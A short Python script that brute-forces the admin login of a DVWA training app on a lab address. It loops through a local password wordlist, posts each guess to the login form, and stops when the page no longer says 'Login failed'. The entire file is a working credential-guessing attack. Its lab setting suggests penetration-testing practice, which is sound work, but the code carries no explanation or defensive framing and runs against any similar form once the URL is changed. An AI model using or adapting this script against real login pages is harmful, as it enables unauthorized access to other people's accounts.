import requests


target_url = "http://10.0.2.6/dvwa/login.php"
data_dict={"username":"admin","password":"","Login":"submit"}


with open("/root/PycharmProjects/passwords","r") as wordfile:
    for line in wordfile:  #for looping each line in the word, but it contains a "\n" at the end
        word = line.strip()
        data_dict["password"] = word
        responses = requests.post(target_url, data=data_dict)
        if "Login failed" not in responses.content.decode(errors="ignore"):
            print("[+]Password Found:-> "+word)
            exit()

print("[-]End of Line No password found")